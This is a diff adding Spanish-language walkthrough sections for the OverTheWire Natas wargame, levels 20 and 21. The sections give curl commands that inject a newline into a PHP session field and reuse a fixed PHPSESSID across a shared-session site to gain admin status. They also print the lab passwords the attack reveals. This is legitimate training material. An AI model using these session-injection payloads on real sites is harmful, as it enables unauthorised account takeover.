@@ -387,3 +387,43 @@ Basta pues con alterar ligeramente el script python del caso anterior para obten
 natas20 : eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 
 # natas20
+
+Analizando el código hay alguna pista relevante; para mí, el comentario de "our encoding is better" es decisivo :)
+
+Por la forma en que se tratan los datos de sesión, parece claro que se trata de inyectar una cadena de la forma "\nadmin 1" en el campo `name`. Podemos hacerlo con `curl`:
+
+Hay que tener solo un par de precaciones:
+
+* fijar el nombre de la cookie de sesión
+* Codificar bien la URL
+
+Y lo tenemos así:
+
+```
+curl --cookie "PHPSESSID=ojoooooo" -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 'http://natas20.natas.labs.overthewire.org?name=admin%0Aadmin%201'
+```
+
+Con eso el fichero está escrito; hacemos una segunda llamada -con esa sesión- para leerlo:
+
+```
+curl --cookie "PHPSESSID=ojoooooo" -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF 'http://natas20.natas.labs.overthewire.org'
+[...]
+You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
+```
+
+# natas21
+
+Este es casi trivial. El sitio "principal" no da muchas opciones, pero comparte "sesiones" con otr que sí nos deja añadir entradas.
+Controlando el PHPSESSID como en el caso anterior, basta con añadir admin=1 como parámetro de POST con tamper data.
+Luego, con el mismo PHPSESSID, leemos los datos en la otra URL:
+
+```
+curl --cookie "PHPSESSID=ojoooooo" -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?submit=update&admin=1'
+curl --cookie "PHPSESSID=ojoooooo" -u natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ 'http://natas21.natas.labs.overthewire.org'
+
+The credentials for the next level are:<br><pre>Username: natas22
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</pre>
+```
+
+#natas 22
